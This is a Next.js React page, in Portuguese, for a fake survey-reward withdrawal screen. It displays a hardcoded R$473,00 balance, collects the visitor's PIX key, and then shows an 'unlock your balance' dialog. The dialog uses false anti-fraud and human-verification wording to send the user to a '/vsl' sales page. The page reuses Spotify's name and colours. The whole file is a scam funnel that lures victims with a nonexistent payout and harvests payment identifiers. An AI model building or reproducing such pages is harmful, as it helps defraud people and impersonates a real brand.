'use client';

import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { cn } from "@/lib/utils";
import { Contact, Phone, Mail, QrCode, DollarSign, Home, HelpCircle } from "lucide-react";
import Image from "next/image";
import { useRouter, useSearchParams } from 'next/navigation';
import { Suspense, useState, useEffect, useRef } from "react";

function WithdrawComponent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const balance = searchParams.get('balance') || '473.00';
  const [pixType, setPixType] = useState<string | null>(null);
  const [pixKey, setPixKey] = useState("");
  const [showValidationPopup, setShowValidationPopup] = useState(false);

  const pixOptions = [
    { type: 'CPF/CNPJ', icon: <Contact /> },
    { type: 'Telefone', icon: <Phone /> },
    { type: 'E-mail', icon: <Mail /> },
    { type: 'Aleatória', icon: <QrCode /> },
  ];

  const handleHomeClick = () => {
    router.push('/survey');
  }

  const handleWithdraw = () => {
    if (pixKey && pixType) {
      setShowValidationPopup(true);
    }
  }
  
  const handleUnlock = () => {
    router.push('/vsl');
  }

  return (
    <div className="flex flex-col min-h-screen bg-[#F0FОF0] text-[#3d4042]">
      <header className="fixed top-0 left-0 right-0 z-10 flex items-center justify-center p-4 bg-white shadow-md">
        <Image src="/opinilogo.png" alt="Spotify" width={109} height={33} />
      </header>

      <main className="flex-grow flex flex-col items-center pt-24 pb-24 px-4">
        <Card className="w-full max-w-md bg-white rounded-lg shadow-lg mb-6">
          <CardContent className="p-4 text-center">
            <p className="text-sm text-gray-500">Seu saldo</p>
            <p className="text-4xl font-bold text-[#1DB954]">R$ {parseFloat(balance).toFixed(2).replace('.', ',')}</p>
          </CardContent>
        </Card>
        
        <Card className="w-full max-w-md bg-white rounded-lg shadow-lg">
          <CardContent className="p-4">
            <p className="text-center font-semibold mb-4">Selecione seu tipo de chave PIX</p>
            <div className="grid grid-cols-4 gap-2 mb-4">
              {pixOptions.map((option) => (
                <Button 
                  key={option.type}
                  variant="outline"
                  className={cn("flex flex-col items-center justify-center h-20 bg-gray-100 border-gray-200 text-xs", {
                    "bg-[#1DB954] text-white border-[#1DB954]": pixType === option.type
                  })}
                  onClick={() => setPixType(option.type)}
                >
                  {option.icon}
                  <span className="mt-1">{option.type}</span>
                </Button>
              ))}
            </div>
            
            <div className="space-y-4">
              <Input 
                placeholder="Digite sua chave PIX aqui" 
                value={pixKey}
                onChange={(e) => setPixKey(e.target.value)}
              />
              <div className="relative">
                <span className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground">R$</span>
                <Input 
                  value="473,00" 
                  readOnly 
                  className="pl-9 font-bold bg-gray-100"
                />
              </div>
              <Button 
                className="w-full h-12 bg-[#1DB954] text-white hover:bg-[#1ED760] font-bold"
                onClick={handleWithdraw}
                disabled={!pixKey || !pixType}
              >
                REALIZAR SAQUE
              </Button>
            </div>
          </CardContent>
        </Card>
      </main>

      <footer className="fixed bottom-0 left-0 right-0 z-10 flex items-center justify-around p-2 bg-white shadow-[0_-2px_5px_rgba(0,0,0,0.1)]">
        <button className="flex flex-col items-center text-[#1DB954]">
          <DollarSign size={28} />
        </button>
        <button className="flex flex-col items-center text-gray-500" onClick={handleHomeClick}>
          <Home size={28} />
        </button>
        <button className="flex flex-col items-center text-gray-500">
          <HelpCircle size={28} />
        </button>
      </footer>

      <Dialog open={showValidationPopup} onOpenChange={setShowValidationPopup}>
        <DialogContent className="sm:max-w-md bg-white p-6 rounded-lg shadow-lg text-center overflow-hidden">
            <div className="relative z-10">
              <DialogHeader>
                  <DialogTitle className="text-xl font-bold text-center">DESBLOQUEAR SEU SALDO</DialogTitle>
              </DialogHeader>
              <div className="text-sm text-gray-600 text-justify my-4 space-y-3">
                <p>Para garantir que sua conta seja de um ser humano e não de um robô, precisamos validar sua identidade e proteger nossos usuários contra fraudes.</p>
                <p>Como medida de segurança, solicitamos que você realize uma pequena validação. Assim, você poderá sacar seu saldo de forma segura e imediata via Pix.</p>
                <p>Este processo é rápido e garante a segurança de todos. Clique no botão abaixo e libere seu saque agora!</p>
              </div>
              <Button onClick={handleUnlock} className="w-full bg-[#1DB954] text-white hover:bg-[#1ED760] font-bold">
                  DESBLOQUEAR AGORA
              </Button>
            </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}


export default function WithdrawPage() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <WithdrawComponent />
    </Suspense>
  );
}
